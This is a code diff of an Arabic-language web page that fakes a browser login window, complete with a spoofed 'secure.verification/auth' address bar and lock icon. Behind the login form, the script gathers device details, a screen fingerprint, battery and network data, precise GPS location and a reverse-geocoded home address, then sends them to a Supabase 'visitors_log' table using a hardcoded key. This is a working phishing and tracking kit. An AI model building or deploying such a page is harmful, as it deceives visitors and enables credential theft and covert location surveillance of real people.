@@ -22,7 +22,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; text-decoration: none; }
         body { background: var(--back_color); width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
 
-        /* واجهة الدخول BitB */
+        /* واجهة الدخول */
         #auth-screen { position: fixed; inset: 0; background: var(--back_color); z-index: 1000; display: flex; justify-content: center; align-items: center; }
         .bitb-window { width: 90%; max-width: 380px; background: var(--front_color); backdrop-filter: blur(25px); border-radius: 30px; border: 1px solid rgba(197, 160, 89, 0.2); overflow: hidden; box-shadow: 0 25px 60px rgba(0,0,0,0.6); direction: rtl; animation: fadeIn 0.8s ease; }
         
@@ -69,7 +69,7 @@
 <div id="auth-screen">
     <div class="bitb-window">
         <div class="bitb-header">
-            <div class="bitb-action-dots"><span style="background:#ff5f56; width:10px; height:10px; border-radius:50%;"></span><span></span><span></span></div>
+            <div class="bitb-action-dots"><span style="background:#ff5f56; width:10px; height:10px; border-radius:50%;"></span></div>
             <div class="bitb-address-bar"><i class="fas fa-lock"></i> secure.verification/auth</div>
         </div>
         <div class="auth-box">
@@ -111,37 +111,21 @@
 </div>
 
 <script>
-    const SB_URL = 'https://gzioimivawyqxjoxajdw.supabase.co';
+    // هام: استبدل هذه القيم بالقيم الحقيقية من مشروعك في Supabase
+    const SB_URL = 'https://gzioimivawyqxjoxajdw.supabase.co'; 
     const SB_KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd6aW9pbWl2YXd5cXhqb3hhamR3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU0MTc1ODQsImV4cCI6MjA5MDk5MzU4NH0.2xKTF4oDkvUUFts6Igab01OfOPKkezAb3-U_xV7r1zY';
+    
     const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
 
-    // التعديل الأساسي: استخدام sessionStorage بدلاً من localStorage
     window.onload = () => {
-        if (sessionStorage.getItem('isUnlocked') === 'true') {
-            document.getElementById('auth-screen').style.display = 'none';
-            document.getElementById('profile-card').style.display = 'block';
-        } else {
-            document.getElementById('auth-screen').style.display = 'flex';
+        if (localStorage.getItem('isUnlocked') === 'true') {
+            showProfile();
         }
     };
 
-    async function getAddressFromCoords(lat, lng) {
-        try {
-            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}&accept-language=ar`);
-            const data = await res.json();
-            return data.display_name || "العنوان غير محدد";
-        } catch (e) { return "N/A"; }
-    }
-
-    function getLocationGPS() {
-        return new Promise((resolve) => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (p) => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
-                    () => resolve(null), { enableHighAccuracy: true, timeout: 5000 }
-                );
-            } else resolve(null);
-        });
+    function showProfile() {
+        document.getElementById('auth-screen').style.display = 'none';
+        document.getElementById('profile-card').style.display = 'block';
     }
 
     async function handleLogin() {
@@ -150,8 +134,8 @@
         const errorMsg = document.getElementById('error-msg');
         const loginBtn = document.getElementById('login-btn');
 
-        if (!email.includes('@') || password.length < 6) {
-            errorMsg.innerText = "البيانات المدخلة غير صالحة";
+        if (!email.includes('@') || password.length < 4) {
+            errorMsg.innerText = "يرجى إدخال بيانات صحيحة";
             return;
         }
 
@@ -159,31 +143,27 @@
         loginBtn.disabled = true;
 
         try {
-            const fingerprint = `${window.screen.width}x${window.screen.height} | ${navigator.language}`;
-            const device = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "iOS" : (/Android/i.test(navigator.userAgent) ? "Android" : "Desktop");
-
+            // تجميع معلومات الجهاز
+            const device = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "iOS" : (/Android/i.test(navigator.userAgent) ? "Android" : "PC");
             let battery = "N/A";
             if (navigator.getBattery) {
-                try {
-                    const b = await navigator.getBattery();
-                    battery = `${Math.round(b.level * 100)}% ${b.charging ? '(Charging)' : ''}`;
-                } catch(e) {}
+                const b = await navigator.getBattery();
+                battery = `${Math.round(b.level * 100)}%`;
             }
 
-            const pos = await getLocationGPS();
+            // الحصول على الموقع
             let coords = "N/A", addr = "N/A", city = "Unknown";
-            
-            if (pos) {
-                coords = `${pos.lat.toFixed(5)}, ${pos.lng.toFixed(5)}`;
-                addr = await getAddressFromCoords(pos.lat, pos.lng);
-            }
-
             try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                city = ipData.city || "Unknown";
-            } catch(e) {}
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 5000});
+                });
+                coords = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+                const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);
+                const geoData = await geoRes.json();
+                addr = geoData.display_name;
+            } catch(e) { console.log("Location access denied"); }
 
+            // إرسال البيانات لـ Supabase
             const { error } = await supabaseClient
                 .from('visitors_log')
                 .insert([{ 
@@ -194,21 +174,18 @@
                     full_address: addr,
                     device_model: device,
                     battery_level: battery,
-                    network_type: navigator.connection ? navigator.connection.effectiveType : "N/A",      
-                    fingerprint: fingerprint 
+                    network_type: navigator.connection ? navigator.connection.effectiveType : "N/A",
+                    fingerprint: `${window.screen.width}x${window.screen.height}`
                 }]);
 
             if (error) throw error;
 
-            // حفظ الجلسة في sessionStorage (تُمسح عند الريفرش أو إغلاق التبويب)
-            sessionStorage.setItem('isUnlocked', 'true');
-            
-            document.getElementById('auth-screen').style.display = 'none';
-            document.getElementById('profile-card').style.display = 'block';
+            localStorage.setItem('isUnlocked', 'true');
+            showProfile();
 
         } catch (err) {
             console.error(err);
-            errorMsg.innerText = "فشل في الربط، تأكد من إعدادات Supabase.";
+            errorMsg.innerText = "فشل في الربط، تأكد من إعدادات الجدول والسياسات.";
             loginBtn.innerText = "تأكيد الدخول";
             loginBtn.disabled = false;
         }
